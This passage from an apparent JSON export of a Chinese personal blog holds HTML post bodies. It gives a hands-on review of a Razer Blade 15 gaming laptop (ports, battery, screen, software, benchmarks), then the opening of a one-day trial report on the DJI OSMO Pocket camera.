面是键盘、扬声器、开机键和触控板，这些后面会细说。<strong>D 面是塑料材质，有两条蛮厚的橡胶条把机身垫高</strong>，猜测是为了散热。</p>\n<p>Razer Blade 15 的接口比较丰富。左侧：</p>\n<ul>\n<li>电源接口</li>\n<li>2 个 USB 3.2 Gen 2 Type-A 接口</li>\n<li>1 个 3.5 mm 组合音频插孔</li>\n</ul>\n<p>右侧：</p>\n<ul>\n<li>1 个 USB 3.2 Gen 2 Type-A 接口</li>\n<li>1 个雷电 3 接口（通过 GPU 输出）</li>\n<li>1 个 HDMI 2.0B 接口</li>\n<li>1 个 MiniDisplayPort 1.4 接口</li>\n<li>安全锁孔</li>\n</ul>\n<p>这些接口日常使用完全够用，通过雷电 3 也能获得不错的拓展性（不过雷电 3 似乎需要跟独显抢带宽…）。</p>\n<p><strong>机身边缘比较锐，不过出乎意料地不是非常割手。</strong>之前在用的 Dell Inspiron 15 7560 边缘极其锋利，非常割手，难受。现在（相对来说）打字舒服很多了，好评。</p>\n<p><strong>机身很薄，薄到有点出乎意料。</strong>官方数据只有 17.8mm，就算加上把机身垫高了的橡胶条也还是比一枚硬币矮。然而毕竟还是塞了这么多硬件进去，看起来轻薄但<strong>实际上一点都不轻</strong>，官方数据 2.07 kg，加上砖头一样的电源适配器，<strong>出趟门其实还是有点累的。</strong></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer9.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer9.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2300\" height=\"1136\" class=\"aligncenter size-full wp-image-1395\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer9.jpg 2300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer9-300x148.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer9-768x379.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer9-1024x506.jpg 1024w\" sizes=\"(max-width: 2300px) 100vw, 2300px\"></a>\n<h1>续航</h1>\n<p>出乎意料，<strong>续航还不错</strong>，达到了我的预期。电池达到了 80Wh，我日常一个 VSCode 写代码，一个 Chrome 查资料，<strong>续航可以达到 8 小时出头</strong>，就算是在玩 HITMAN 1 小时后，电量仍能剩余一半左右。也就是说，短时间的移动办公完全不是问题，可以不带上厚重的电源适配器，算是解决了一部分「重」的问题吧。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer12.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer12.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2500\" height=\"1860\" class=\"aligncenter size-full wp-image-1397\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer12.jpg 2500w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer12-300x223.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer12-768x571.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer12-1024x762.jpg 1024w\" sizes=\"(max-width: 2500px) 100vw, 2500px\"></a>\n<p><span>电源适配器有点大</span></p>\n<h1>屏幕</h1>\n<p><strong>爽！真的爽！240Hz 刷新率带来的是实打实的流畅感</strong>，和 90Hz 那种需要用一段时间才能感受到的流程感不同， 240Hz 带来的是在桌面上划划鼠标都能感受到的异常流畅的感觉。</p>\n<p>不过受限于这块 2070 Max-Q，很多游戏游戏都没能完全利用这块屏幕的性能，再加上我不玩 FPS 游戏，高刷新率对我来说意义不大，<strong>这块屏幕的 240Hz 对我来说噱头大于实际作用（但是没得选啊…）。</strong>屏幕为 IPS 面板，覆盖 100% sRGB，并有出厂校色。由于我手头没有校色设备，具体参数暂时无法测量，但就官方数据来看，这块屏幕的素质还是不错的。当然 4K 版本由于面向设计师等，屏幕参数会更好，可惜我是体验不到了。</p>\n<h1>键盘、触控板和扬声器</h1>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer5.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer5.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2300\" height=\"1619\" class=\"aligncenter size-full wp-image-1391\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer5.jpg 2300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer5-300x211.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer5-768x541.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer5-1024x721.jpg 1024w\" sizes=\"(max-width: 2300px) 100vw, 2300px\"></a>\n<p>打开屏幕第一反应：<strong>这触控板有点大啊。</strong>Rzaer Blade 15 配备的触控板比 Dell Inspiron 15 7560 大上一整圈，采用类玻璃材质，手感不错。触控板使用了微软 Precision 驱动，对 Windows 的各类手势支持良好。</p>\n<p><strong>键盘总的来说还行</strong>，键程不短，触感不算太软，为平面键帽；没有小键盘，不过方向键的大小与其他键一致。有一点要吐槽的就是键盘的按键标识是上下颠倒的…也就是需要配合 <kbd>Shift</kbd> 使用的键的标识反而在直接使用的键的标识的下方…虽然影响不大，但打字时看到键盘着实觉得违和。</p>\n<p>没有了小键盘，C 面多出来的空间被留给了扬声器。<strong>而这个声音…比较一般</strong>，整体听感有些薄而含混。不过好歹是 C 面朝上的双扬声器，声音还算清楚，而且立体声的感觉较强。加上自带的 Dolby Atmos 加成，<strong>总体听感还算可以。</strong></p>\n<p>另外，开机键被藏在了右侧扬声器上方，没有灯，有些低调。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer6.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer6.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2300\" height=\"2264\" class=\"aligncenter size-full wp-image-1392\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer6.jpg 2300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer6-300x295.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer6-768x756.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer6-1024x1008.jpg 1024w\" sizes=\"(max-width: 2300px) 100vw, 2300px\"></a>\n<h1>系统</h1>\n<p>出厂带有 Windows 10 家庭版，预装雷蛇雷云。在雷云内不仅可以调整这台电脑的灯光、性能等设置，还可以一并调整所有连接到这台电脑的雷蛇外设的设置。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer1.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer1.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1280\" height=\"719\" class=\"aligncenter size-full wp-image-1387\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer1.jpg 1280w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer1-300x169.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer1-768x431.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer1-1024x575.jpg 1024w\" sizes=\"(max-width: 1280px) 100vw, 1280px\"></a>\n<p><span>雷云 3 主界面</span></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer4.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer4.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1280\" height=\"719\" class=\"aligncenter size-full wp-image-1390\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer4.jpg 1280w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer4-300x169.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer4-768x431.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer4-1024x575.jpg 1024w\" sizes=\"(max-width: 1280px) 100vw, 1280px\"></a>\n<p><span>灯光拥有丰富的自定义选项（灯厂无疑了）</span></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer3.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer3.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"434\" height=\"262\" class=\"aligncenter size-full wp-image-1389\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer3.jpg 434w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer3-300x181.jpg 300w\" sizes=\"(max-width: 434px) 100vw, 434px\"></a>\n<p><span>可以调整屏幕刷新率</span></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer7.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer7.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2500\" height=\"1875\" class=\"aligncenter size-full wp-image-1393\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer7.jpg 2500w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer7-300x225.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer7-768x576.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer7-1024x768.jpg 1024w\" sizes=\"(max-width: 2500px) 100vw, 2500px\"></a>\n<p><span>通过 Chroma 可以在支持的软件内使键盘背光与软件内容同步</span></p>\n<p><strong>不过由于雷蛇的服务器在大陆一向不稳定，雷云在实际体验上真的是…一言难尽。</strong>有时候会莫名开机不自启、主面板无限加载、灯光配置无法应用…心累。</p>\n<p>此外，显卡驱动似乎也不太稳定（这大概是英伟达的锅？）。偶尔屏幕会突然黑掉，需要合盖再开盖才能再次唤醒屏幕；甚至有一次我遇到了 10 分钟内连续两次蓝屏…至少从错误代码来看问题出在显卡驱动。不过这些问题遇到的几率也不大，一个月内绝大部分时间它还是正常工作的，显卡驱动也没有在我游戏的时候崩掉过。还算能用吧。</p>\n<h1>性能</h1>\n<p>作为妥妥的游戏本，Razer Blade 15 配备了 i7-9750H，RTX2070 Max-Q，16 GB 内存，<strong>性能自然是不差的，基本达到了这一水平笔记本的一般水准。</strong></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer19.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer19.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"702\" height=\"400\" class=\"aligncenter size-full wp-image-1410\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer19.jpg 702w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer19-300x171.jpg 300w\" sizes=\"(max-width: 702px) 100vw, 702px\"></a>\n<p><span>CPU-Z 和 GPU-Z</span></p>\n<p>i7-9750H 默频 2.60GHz，睿频可达 4GHz 左右，<strong>然而只是 30 秒真男人。</strong>25度室温、高性能模式下 30 秒左右的满负载就会让这块 CPU 撞墙，频率会掉到 3GHz 出头并稳定在此，<strong>而平衡模式则更快。</strong></p>\n<p>Razer Blade 15 配备的是一块 Max-Q 版本的 RTX2070，<strong>而且是较低功耗 80W 的版本</strong>，猜测是为了散热考虑（毕竟这么薄了）。风扇全开散热时风扇声音较响，但仍能忍受；而且日常工作使用一般不会使风扇转起来，<strong>因此噪音控制还算不错。</strong></p>\n<p>由于是这篇算是简评，并没有详测游戏，直接上跑分吧。室温 25 度， 平衡模式下 Cinebench R20 分数 1927，有些偏低；而使用高性能模式时分数直接飙到 2424 分，看来平衡模式功耗墙砍得比较狠。（顺便提一句，雷蛇甚至提供了功耗更低的性能方案，没有什么测试的必要就不测了。）</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer17.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer17.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"753\" height=\"637\" class=\"aligncenter size-full wp-image-1405\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer17.jpg 753w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer17-300x254.jpg 300w\" sizes=\"(max-width: 753px) 100vw, 753px\"></a>\n<p>在 3DMark Time Spy 测试下平衡模式 6283 分，高性能模式 6872 分，相比有一点的提升。只能说压得够狠。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer18.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer18.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1920\" height=\"954\" class=\"aligncenter size-full wp-image-1406\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer18.jpg 1920w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer18-300x149.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer18-768x382.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer18-1024x509.jpg 1024w\" sizes=\"(max-width: 1920px) 100vw, 1920px\"></a>\n<p><span>平衡模式</span></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer20.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer20.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1920\" height=\"957\" class=\"aligncenter size-full wp-image-1408\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer20.jpg 1920w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer20-300x150.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer20-768x383.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer20-1024x510.jpg 1024w\" sizes=\"(max-width: 1920px) 100vw, 1920px\"></a>\n<p><span>高性能模式</span></p>\n<p>至于这 16GB 的内存…至少我是完全够用，要升级的话也可以自行更换到最高 64GB。</p>\n<h1>总结</h1>\n<p>这已经不是雷蛇第一年做笔记本了。总的来看，雷蛇似乎已经有些摸清了门道。今年年中推出的配备 9 代 Intel CPU 的灵刃系列几乎可以说是在各个方面都做到了尽可能完美。当然问题也有一些，相信雷蛇可以在后续解决。总结一下我手头的这台笔记本吧。</p>\n<p>优点：</p>\n<ul>\n<li>高性能的同时有较长续航</li>\n<li>优秀的屏幕</li>\n<li>干净的外观设计</li>\n<li>薄而坚固的机身</li>\n<li>较丰富的 IO</li>\n<li>细节到位（Wi-Fi 6、Windows Hello 等等）</li>\n</ul>\n<p>缺点：</p>\n<ul>\n<li>价格稍高</li>\n<li>驱动、软件等有些不稳定</li>\n<li>为了散热有一定的性能损失</li>\n<li>机身偏重</li>\n</ul>\n<p>当我正准备结束这篇简评的时候正好收到了雷蛇雷云驱动更新，其中包含了我这一型号的「问题修复与改进」。待会儿就去更新，看看雷蛇有没有解决一部分问题吧。</p>\n<p>最后加一句，本文所有图片都是由一加 7 Pro 拍摄的，也就这样吧…</p>\n","link":"https://flyhigher.top/diary/1411.html"},{"title":"OSMO Pocket 一日试用报告","date":"2019-02-02 09:38:38","description":"\n<p>计划寒假出门练练延时视频的拍摄，碰巧得知老师买了一个 <a href=\"https://www.dji.com/osmo-pocket\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">OSMO Pocket</a>，正好我对这玩意儿有点兴趣，就向老师借了一天玩了玩，带着它在城市里跑了一圈，这篇文章算是试用后的总结报告。不过这毕竟只是一天快速试用之后的总结，如果有不正确或是不完善的地方还请见谅。</p>\n<p><strong>TL;DR:</strong> 这款产品目前应该只适用于重度 Vlog 拍摄者，相对其他拍摄方案有一些优势，但也有很多不足。对我来说，我本来没有太强烈的购买 OSMO Pocket 的欲望，试用过后依然没有太大的购买欲望。<strong>请谨慎考虑购买。</strong></p>\n<p>（如果出二代我可能会买吧…（小声）</p>\n<blockquote><p>这篇文章中所有图片和视频<strong>都经过二次压缩以缩短在网页上的加载时间，不代表 OSMO Pocket 的真实拍摄水平</strong>（当然所有评测都基于未压缩的原始图像），如果需要原始图像可以直接联系我。另外，本文中的多数照片/视频都是“为评测而拍”，没有刻意追求美感，虽然观感不一定好，但这不代表 OSMO Pocket 就拍不出好看的照片/视频——<strong>毕竟“人”才是一张照片是否“美”的决定因素。</strong></p></blockquote>\n<h1>初印象</h1>\n<p><strong>到手的第一印象：好小啊。</strong>虽然对 OSMO Pocket 已经提前有所了解，但刚刚接触它时仍惊讶于它的体积。就算有一层保护壳， OSMO Pocket 还是可以被轻松地放进口袋里，相对于手机+稳定器的方案，OSMO Pocket 便携多了，好评。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/3.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/3.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1867\" height=\"2500\" class=\"aligncenter size-full wp-image-1313\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/3.jpg 1867w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/3-224x300.jpg 224w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/3-768x1028.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/3-765x1024.jpg 765w\" sizes=\"(max-width: 1867px) 100vw, 1867px\"></a>\n<p><strong>完全启动的速度挺快</strong>，不过屏幕不大。屏幕支持触摸，而机身上的实体按键只有两个。简单试用了下，在屏幕上的操作主要以滑动为主，操作逻辑还算清晰，不过这个触屏对于点击的灵敏度真的挺低的，经常出现点击却没有反应的情况 。两个实体按键之一就是拍摄键，熟悉了之后操作效率还是很高的。好评。</p>\n<p>不过由于屏幕小，实际情况下很多操作无法在屏幕上完成，<strong>因此连接手机后的 OSMO Pocket 才算得上是完整体。</strong>其与手机的连接通过物理连接（连接头）实现（不过可以通过配件实现无线连接）。</p>\n<p>我拿到 OSMO Pocket 时它已经被使用了一段时间了，手机连接头已经插在机身上了。虽然这个连接头可以卸下并反装（以保护连接头）或者换上接口保护板，但是实际操作中要卸下连接头非常麻烦，所以一般情况下为了方便使用，连接头只能以这种有点难看的姿势插在机身上。DJI 甚至考虑到了这个问题，在保护壳的绑带上切了个口子，方便连接头伸出…</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/2.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/2.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2000\" height=\"2279\" class=\"aligncenter size-full wp-image-1314\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/2.jpg 2000w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/2-263x300.jpg 263w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/2-768x875.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/2-899x1024.jpg 899w\" sizes=\"(max-width: 2000px) 100vw, 2000px\"></a>\n<p>奇葩的保护壳</p>\n<p>机身底部是一个 USB Type-C 接口，用来充电，好评。不过没有标准螺口，没法直接固定在三脚架上，需要购买额外配件，很难受。</p>\n<p>此外使用时需要从机身侧面插入一张 SD 卡用于存储拍摄内容，通过配套的 DJI Mimo APP 可以将拍摄的内容传输到手机上。DJI Mimo 同时可以在 OSMO Pocket 连接到手机后作为拍摄控制器使用。</p>\n<p>第一眼看上去，OSMO Pocket 的镜头看起来跟普通手机的镜头差不多，不过具体表现还是要在试用后才能知道。</p>\n<h1>绝赞试用中</h1>\n<p>大概熟悉了一下操作，我第二天就带着 OSMO Pocket 出门了。<strong>最大的感受是太小巧了，至少比手机+稳定器的组合甚至是 GoPro+延长杆的组合要小很多</strong>，这带来了两方面的影响，一是我可以更快地进入拍摄状态，实测我从摸口袋到 OSMO Pocket 完成启动进入拍摄状态不超过 10 秒钟；二是小巧的机身也让 OSMO Pocket 在拍摄时显得更加低调，让我这种脸皮比较薄的人减少了很多心理压力。<strong>综合起来就是让我更愿意经常取出它来拍摄了。</strong></p>\n<h2>拍摄体验</h2>\n<p>我第一个使用的功能是延时视频，结果发现没有标准螺口带来的问题比我想象的还要严重。总之最后为了能顺利地拍完延时，我不得不用一种很难受的姿势把它摁在三脚架的云台上并这样保持十几分钟…然而就算是这样后来还是翻车了（</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/15.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/15.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2428\" height=\"2500\" class=\"aligncenter size-full wp-image-1350\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/15.jpg 2428w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/15-291x300.jpg 291w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/15-768x791.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/15-995x1024.jpg 995w\" sizes=\"(max-width: 2428px) 100vw, 2428px\"></a>\n<p>完全没法固定</p>\n<blockquote><p>买配件是不可能买配件的，这辈子都不可能买配件的，只能靠暴力摁住才勉强拍的了延时这个样子。</p></blockquote>\n<p><video controls poster=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/osmo3.jpg\" preload=\"none\"><source src=\"https://video.flyhigher.top/flyhigher/osmo/3.webm\" type=\"video/webm\"><source src=\"https://video.flyhigher.top/flyhigher/osmo/3.mp4\" type=\"video/mp4\">你的浏览器太旧，无法观看此视频。</source></source></video></p>\n<p>摁得太用力了，三脚架云台没锁牢转偏了…</p>\n<p><strong>一个优点是拍摄延时视频时可以让云台按设定好的轨迹自动旋转。</strong>不过直接在内建屏幕上只能设定两个云台位置关键点，要连接手机才能比较方便地设定最多不超过四个关键点。延时视频的拍摄不支持防抖，任何轻微的抖动都会可能会导致成品在导出之后需要进行额外的防抖处理。</p>\n<p><video controls poster=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/osmo2.jpg\" preload=\"none\"><source src=\"https://video.flyhigher.top/flyhigher/osmo/2.webm\" type=\"video/webm\"><source src=\"https://video.flyhigher.top/flyhigher/osmo/2.mp4\" type=\"video/mp4\">你的浏览器太旧，无法观看此视频。</source></source></video></p>\n<p>直出延时，可以看到有轻微抖动</p>\n<p>为了方便调整云台位置我把手机插上了，然后发现这样的连接方式其实有点别扭。<strong>单手握持是不可能了：</strong>如果握着 OSMO Pocket，不仅整体重心会严重偏向手机，而且连接头大概不能长时间地支撑住悬空的手机；如果握住手机，OSMO Pocket 不算太轻的重量依然会让我担心连接头是否会损坏。算了，还是两个一起握着吧。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/4.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/4.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2300\" height=\"2244\" class=\"aligncenter size-full wp-image-1315\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/4.jpg 2300w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/4-300x293.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/4-768x749.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/4-1024x999.jpg 1024w\" sizes=\"(max-width: 2300px) 100vw, 2300px\"></a>\n<p>连接手机示意图</p>\n<p>一度考虑过要不要暂时不带 OSMO Pocket 的保护壳了，毕竟保护壳还是有点占体积的，而且每次拍摄时将本体装入取出保护壳的动作也要花一点时间。<strong>但是后来发现保护壳其实必不可少。</strong>关机后云台会自动收缩到适合装入保护壳的状态，但由于云台的姿态锁定只会持续十几秒的时间，之后云台就会解锁以至于可以随外力转动，如果不及时放回保护壳内云台就有损坏的可能。</p>\n<p>拍着拍着，突然发现…诶我的电量呢？！<strong>OSMO Pocket 的掉电非常快</strong>，大概是太小的机身里塞不下太大电池的缘故，实际使用中大概1分钟就可以掉1%的电，如果打算重度使用，一个充电宝或是官方的充电盒是必不可少的了。</p>\n<p>接着试着拍了几段视频。防抖效果不用多说了，作为 OSMO Pocket 最大卖点之一，<strong>防抖效果的确非常优秀。</strong>云台有多种跟随方式，在屏幕上点几下就能切换，很方便。可以选定一块区域让云台跟随，大部分情况下不会跟丢（除非你跑偏得云台都到限位了…）。最高支持 4K/60fps 拍摄，同时有多种帧率可选，不过想要高码率模式还得使用 1080p 拍摄。</p>\n<p><video controls poster=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/osmo4.jpg\" preload=\"none\"><source src=\"https://video.flyhigher.top/flyhigher/osmo/4.webm\" type=\"video/webm\"><source src=\"https://video.flyhigher.top/flyhigher/osmo/5.mp4\" type=\"video/mp4\">你的浏览器太旧，无法观看此视频。</source></source></video></p>\n<p>没有特地压缓脚步，只剩下小幅上下移动了</p>\n<p><strong>视频的收音…很迷，不能算好，甚至只能算是“勉强能听”，听起来就感觉隔着层东西。</strong>作为一个主要面向 Vlogger 的产品我不清楚这样砍音质的目的是什么，不过好在 DJI 提供了音频转接头的附件，可以外接麦克风。（又要买附件！）</p>\n<p>除了拍摄视频和延时视频，OSMO Pocket 还有拍照、全景和慢动作三个模式。拍照基本就是按一下按钮的事，不过有 M 档，可以调整快门速度等，这意味着或许可以使用 OSMO Pocket 拍摄流光照片，不过我没来得及尝试。同时可以保存 DNG 格式的照片，好评；全景只有固定的 180° 视角（可以算是1×4）和 3×3 两种模式，而且无法直接在内建屏幕上查看已拍摄的全景照片，必须使用 APP 查看（似乎全景的拼接过程也是在手机上完成的）；慢动作基本是高帧率的 1080p 视频，会在机内完成放慢的处理。<strong>值得注意的是在慢动作模式下镜头视角会变小很多（官方数据为 34.9°）。</strong></p>\n<p>配套的 APP DJI Mimo 在拍摄方面还算好用（不过首页的类抖音风格我真的受不了…）。可设置项不算多，但布局还算清晰，不难上手，跟直接在内建屏幕上操作相比，APP 用起来还是很爽的。搭配 DJI 一贯的“一键制作视频”功能，拍摄剪辑分享可以说是一气呵成。当然如果有精细制作的需求还是导出来用专业软件剪比较好。<strong>不过通过 APP 只能查看机内 SD 卡中的“成品”，比如延时视频只能导出视频而不能导出每一帧的原始图像</strong>，官方称需要使用电脑才能导出其在拍摄延时视频中拍摄的 JPEG 原始图像，不过我没来得及用电脑连上看一看。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/5.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/5.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1920\" height=\"1080\" class=\"aligncenter size-full wp-image-1316\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/5.jpg 1920w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/5-300x169.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/5-768x432.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/5-1024x576.jpg 1024w\" sizes=\"(max-width: 1920px) 100vw, 1920px\"></a>\n<p>APP 的拍摄界面</p>\n<h2>拍摄质量</h2>\n<p>说一下“画质”。先看一下官方参数：1/2.3” CMOS，F/2，等效焦距 26mm。<strong>注意一下这个等效焦距并不广，尤其自拍的时候很容易出现“满屏幕都是脸”的情况。</strong></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/9.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/9.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"540\" height=\"362\" class=\"aligncenter size-full wp-image-1320\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/9.jpg 540w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/9-300x201.jpg 300w\" sizes=\"(max-width: 540px) 100vw, 540px\"></a>\n<p>官网截图</p>\n<p>直接下结论：<strong>在我看来 OSMO Pocket 在照片/视频的拍摄质量方面与手机相比没有什么优势，甚至不如一些旗舰手机。</strong>照片比较平淡，曝光看看就好，画面放大看有比较严重的涂抹感，同时画面边缘有一些畸变。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/8.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/8.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2300\" height=\"1251\" class=\"aligncenter size-full wp-image-1336\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/8.jpg 2300w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/8-300x163.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/8-768x418.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/8-1024x557.jpg 1024w\" sizes=\"(max-width: 2300px) 100vw, 2300px\"></a>\n<p>直出照片及其 EXIF 信息</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/12.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/12.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2500\" height=\"1360\" class=\"aligncenter size-full wp-image-1341\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/12.jpg 2500w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/12-300x163.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/12-768x418.jpg 768w, 